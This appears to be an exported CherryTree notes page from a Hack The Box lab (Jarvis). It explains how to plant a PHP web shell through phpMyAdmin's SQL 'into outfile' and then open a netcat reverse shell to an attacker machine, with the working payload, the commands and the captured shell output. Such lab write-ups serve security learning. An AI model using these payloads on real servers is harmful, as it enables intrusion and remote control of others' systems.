<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Execute code & get shell</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># phpMyAdmin - Execute code &amp; get a shell</h1></strong><br />• <a href="https://www.hackingarticles.in/shell-uploading-web-server-phpmyadmin/">https://www.hackingarticles.in/shell-uploading-web-server-phpmyadmin/</a> - A great how-to<br /><br />Using SQL&#39;s <code>into outfile</code> statement and <code>phpMyAdmin</code>&#39;s web interface, we can write a php file to the system and get a reverse shell.<br /><br /><strong>Examples</strong><br />• hackthebox Jarvis<br /><br /><strong><h2>## Get code execution</h2></strong><br />Pick a table to run SQL queries on. <br />I chose <code>jnmxv</code> because it looked like a dummy table. You could pick any.<br /><br />Select the <code>SQL</code> tab so that we can run SQL commands.<br /><a href=""><img src="images/226-1.png" alt="images/226-1.png" /></a><br /><br />This SQL statement<br /><code>SELECT &quot;&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;&quot; into outfile &quot;/var/www/html/shell5000.php&quot;</code><br />will write a php file called <code>shell5000.php</code> to the filesystem.<br /><br />Write your SQL statement into the text box and click <code>Go</code> to run the SQL query.<br /><a href=""><img src="images/226-2.png" alt="images/226-2.png" /></a><br /><br />You should receive a response saying that the query ran successfully :)<br /><a href=""><img src="images/226-3.png" alt="images/226-3.png" /></a><br /><br />Now to run commands, visit:<br /><code>http://10.10.10.143/shell5000.php?cmd=&lt;command&gt;</code><br /><br />For example, to run <code>id</code> visit:<br /><code>http://10.10.10.143/shell5000.php?cmd=id</code><br /><a href=""><img src="images/226-4.png" alt="images/226-4.png" /></a><br /><br /><strong><h2>## Get a reverse shell</h2></strong><br />You can get a reverse shell by achieving code execution via the technique above, and then executing a reverse shell command.<br /><br />For example, start a listener on your attacking machine.<br /><div class="codebox"><div class="codebox">root@gotham:~/ctf/jarvis#&nbsp;nc&nbsp;-lvnp&nbsp;9001<br />listening&nbsp;on&nbsp;[any]&nbsp;9001&nbsp;...</div></div><br /><br />And then run <code>nc &lt;attacker ip&gt; &lt;listening port&gt; -e /bin/bash</code> to execute a reverse shell.<br /><a href=""><img src="images/226-5.png" alt="images/226-5.png" /></a><br /><br />You should receive a shell!<br /><div class="codebox"><div class="codebox">...<br />listening&nbsp;on&nbsp;[any]&nbsp;9001&nbsp;...<br />connect&nbsp;to&nbsp;[10.10.14.11]&nbsp;from&nbsp;(UNKNOWN)&nbsp;[10.10.10.143]&nbsp;44036<br />id<br />uid=33(www-data)&nbsp;gid=33(www-data)&nbsp;groups=33(www-data)<br />python&nbsp;-c&nbsp;&#39;import&nbsp;pty;&nbsp;pty.spawn(&quot;/bin/bash&quot;)&#39;&nbsp;<br />www-data@jarvis:/var/www/html$&nbsp;</div></div></div>
</body>
</html>
